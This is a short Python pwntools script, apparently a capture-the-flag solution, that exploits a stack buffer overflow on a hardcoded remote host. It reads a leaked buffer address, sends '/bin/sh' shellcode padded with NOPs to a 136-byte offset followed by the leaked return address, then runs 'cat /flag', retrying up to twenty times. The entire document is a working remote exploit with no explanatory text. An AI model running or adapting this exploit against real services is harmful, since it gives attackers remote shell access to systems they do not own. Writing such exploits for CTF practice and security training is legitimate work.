from pwn import *


HOST = "47.99.147.34"
PORT = 10303
OFFSET = 136
ATTEMPTS = 20


def main():
    context.arch = "amd64"
    shellcode = asm(shellcraft.sh())
    payload_prefix = shellcode.ljust(OFFSET, b"\x90")

    for attempt in range(1, ATTEMPTS + 1):
        io = None
        try:
            io = remote(HOST, PORT)
            io.recvuntil(b"Buffer at: ", timeout=3)
            buf_addr = int(io.recvline().strip(), 16)
            log.success(f"attempt {attempt}: buffer leak = {hex(buf_addr)}")
            io.recvuntil(b"Message: ", timeout=3)
            io.send(payload_prefix + p64(buf_addr))
            io.recvuntil(b"Thank you for your message!\n", timeout=3)
            io.sendline(b"cat /flag")
            data = io.recvrepeat(2)
            print(data.decode("latin-1", errors="replace"), end="")
            return
        except Exception as exc:
            log.warning(f"attempt {attempt} failed: {exc!r}")
            sleep(1)
        finally:
            try:
                if io is not None:
                    io.close()
            except Exception:
                pass

    raise SystemExit("failed to retrieve flag after retries")


if __name__ == "__main__":
    main()
